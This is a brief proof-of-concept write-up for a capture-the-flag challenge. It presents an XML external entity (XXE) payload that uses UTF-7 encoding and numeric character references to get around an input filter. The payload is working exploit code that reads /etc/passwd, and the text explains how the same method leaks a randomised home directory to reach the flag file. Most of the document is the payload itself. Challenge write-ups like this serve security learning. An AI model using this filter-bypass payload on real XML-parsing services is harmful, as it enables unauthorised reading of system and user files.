# PoC

Simple challenge that bypass the filter using UTF-7 encoding!
This example below is try to read **/etc/passwd**.

```xml
<?xml version="1.0" encoding="UTF-7" standalone="yes" ?>
+ADw!DOCTYPE root +AFs
  +ADw!ENTITY % pwn "
  +ADw!ENTITY data &#83;&#89;&#83;&#84;&#69;&#77; '&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;'>
  ">
%pwn;
+AF0>
<svg>
  <p>&data;</p>
</svg>
```

The example above is also to read the randomize user home directory.
After all randomize value is leaked we're already to get the flag, which is like **/home/[random]/flag.txt**
